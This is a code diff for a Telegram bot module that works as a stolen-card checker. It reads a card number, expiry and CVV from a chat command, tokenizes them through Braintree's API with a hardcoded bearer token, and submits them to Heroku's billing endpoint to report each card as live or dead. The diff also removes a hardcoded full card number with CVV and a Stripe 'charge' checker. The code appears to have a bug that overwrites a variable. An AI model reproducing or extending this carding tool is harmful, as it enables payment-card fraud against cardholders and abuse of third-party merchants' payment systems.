@@ -1,7 +1,17 @@
-from requests import get, patch
+from urllib import response
+from requests import get, patch, post
 from telethon import Button
 
 from ._handler import newMsg
+
+B3_MESSAGE = """
+**B3/Auth** {emoji}
+**Credit Card Number:** `{card_number}`
+**CVC:** `{cvc}`
+**Expiration:** `{exp_mo}/{exp_year}`
+**Status:** __**{status}**__
+**Message:** `{message}`
+"""
 
 
 def get_uuid(cc, exp, cvc):
@@ -50,46 +60,25 @@ async def _stripe(e):
         return
     message = await e.reply("`Processing...`")
     cc, exp_mo, exp_year, cvv = arg.split("|", 3)
-    if len(exp_year) == 4:
-        exp_year = exp_year[2:]
-    exp = exp_mo + "|" + exp_year
-    cc = cc.replace(" ", "")
-    result, code, mess, time, emoji = get_uuid(cc, exp, cvv)
-    if result == "success":
-        msg = """
-        ```Card has been successfully charged.```
-        card: ```{}```
-        amount: ```$10.00```
-        gateway: ```Stripe```
-        status: ```Success```
-        time taken: ```{}```
-        """.format(
-            cc, round(int(time), 2)
-        )
-        buttons = Button.url("Payment Page", "https://google.com")
-    else:
-        msg = "**¥ Stripe/Charge/1$**"
-        msg += "\n**› Card:** `{}`"
-        msg += "\n**› Status:** {}"
-        msg += "\n**› Message:** {}"
-        msg += "\n**› Code:** {}"
-        msg += "\n**› TimeTaken:** ```{}s```"
-        msg += "\n**› Credits:** 10k"
-        msg += "\n**› Checked By:** [{}](tg://user?id={})"
-        buttons = Button.url("Payment Page (Soon)", "https://google.com")
-        msg = msg.format(
-            arg,
-            emoji,
-            mess,
-            code,
-            round(int(time), 2),
-            e.sender.first_name,
-            e.sender_id,
-        )
-    await message.edit(msg, buttons=buttons)
+    token = tokenize_card(cc.strip(), cvv.strip(),
+                          exp_mo.strip(), exp_year.strip())
+    if token is None:
+        await message.edit("`Invalid card details.`")
+        return
+    response = b3_auth_heroku(token)
+    status, message, emoji = b3_response_parser(response)
+    await message.edit(B3_MESSAGE.format(
+        emoji=emoji,
+        card_number=cc,
+        cvc=cvv,
+        exp_mo=exp_mo,
+        exp_year=exp_year,
+        status=status,
+        message=message
+    ))
 
 
-def b3_auth_heroku():
+def b3_auth_heroku(token):
     headers = {
         "authority": "api.heroku.com",
         "accept": "application/vnd.heroku+json; version=3",
@@ -106,7 +95,7 @@ def b3_auth_heroku():
         "postal_code": "10800",
         "state": "IL",
         "other": None,
-        "nonce": "tokencc_bh_q2spv3_8rhkvk_cpyv8s_7s2q4r_pzz",
+        "nonce": token,
         "device_data": '{"device_session_id":"1f5d4e42701386875b8fe252e96bab97","fraud_merchant_id":"604019","correlation_id":"c1769c09ffdd118cdbc763507964b026"}',
     }
 
@@ -116,24 +105,12 @@ def b3_auth_heroku():
     return response.json()
 
 
-def tokenize_cc():
+def tokenize_card(card_number, cvc, exp_mo, exp_year):
     headers = {
         "Accept": "*/*",
         "Accept-Language": "en-US,en;q=0.9",
         "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2NTkxNzYwNzgsImp0aSI6IjY0M2Y0YzE1LWNiNmMtNDY1Ny1hOWQ5LTUxNTI2MTQzMDlhZSIsInN1YiI6IjM2OTZzNzczeWRjMnoycjMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2OTZzNzczeWRjMnoycjMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.-FyX5EeRKk2j1W5gUEzJXi24RDymCKMyWep9CLqIPyQt63ZggmrbB_cYwovnAaMkxM7LjkWUORERtOmYTNDWxg",
         "Braintree-Version": "2018-05-10",
-        "Connection": "keep-alive",
-        # Already added when you pass json=
-        # 'Content-Type': 'application/json',
-        "Origin": "https://assets.braintreegateway.com",
-        "Referer": "https://assets.braintreegateway.com/",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "cross-site",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
-        "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
-        "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": '"Windows"',
     }
 
     data = {
@@ -146,10 +123,10 @@ def tokenize_cc():
         "variables": {
             "input": {
                 "creditCard": {
-                    "number": "5178058528882106",
-                    "expirationMonth": "10",
-                    "expirationYear": "2024",
-                    "cvv": "061",
+                    "number": card_number,
+                    "expirationMonth": exp_mo,
+                    "expirationYear": exp_year,
+                    "cvv": cvc,
                 },
                 "options": {
                     "validate": False,
@@ -162,3 +139,15 @@ def tokenize_cc():
     response = post(
         "https://payments.braintree-api.com/graphql", headers=headers, json=data
     )
+    try:
+        return response.json()["data"]["tokenizeCreditCard"]["token"]
+    except:
+        return None
+
+
+def b3_response_parser(resp):
+    DEAD = "❌"
+    ALIVE = "✅"
+    if resp.get("id", "") == "invalid_params":
+        return "Declined", resp.get("message", "-"), DEAD
+    return "Approved", resp.get("message", "-"), ALIVE
